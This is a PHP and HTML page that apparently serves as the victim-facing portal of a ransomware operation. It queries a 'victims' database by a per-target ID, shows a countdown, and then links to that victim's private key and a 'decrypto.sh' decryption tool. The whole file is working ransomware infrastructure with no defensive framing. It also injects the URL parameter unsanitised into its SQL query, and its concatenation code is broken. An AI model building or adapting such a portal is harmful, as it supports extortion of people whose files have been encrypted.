<html>
  <head>
    <title>
      Payment Confirmation
    </title>
    <script src="/scripts/jquery.js"></script>
  </head>
<?php

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "victims";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$timestamp = time();
$dateTimestamp = new DateTime("@$timestamp");

$timestamp = $dateTimestamp->format('Y-m-d H:i:s');

if (isset($_GET['unique_id']) && !empty($_GET['unique_id'])) {
   $uniqueID = $_GET['unique_id'];
   $sql = "SELECT timediff(exp_time, \"$timestamp\") as time_left from target_list where unique_id = \"$uniqueID\"";
   $result = $conn->query($sql);

   if ($result->num_rows > 0) {
      while ($row = $result->fetch_assoc()) {
         if ($row['time_left'] < "00:00:01") {
            echo "<center><a href=\"" +  $_SERVER['SERVER_NAME'] + "/" + $uniqueID + "/priv.pem\">Private Key Download</a></center>";
            echo "<br /><ber />";
            echo "<center><a href=\"" +  $_SERVER['SERVER_NAME'] + "/downloads/decrypto.sh\">Decryption Software Download</a></center>";
         } else {
            echo "<script>" . "\n";
            echo "   $(document).ready(function() {" . "\n";
            echo "     setInterval(function() {" . "\n";
            echo "       $.get(\"time_query.php?unique_id=$uniqueID\", function (result) {" . "\n";
            echo "         $('#show_timer').html(result);" . "\n";
            echo "       });" . "\n";
            echo "     }, 1000);" . "\n";
            echo "  });" . "\n";
            echo "</script>" . "\n";
         }
      }
   }
}

$conn->close();

?>
  <body>
    <center>
      <h1>
        <font color="green">
          Time Remaining Until Decryption Possible:
          <br /><br />
          <div id="show_timer" name="show_timer"></div>
        </font>
      </h1>
    </center>
  </body>
</html>
  
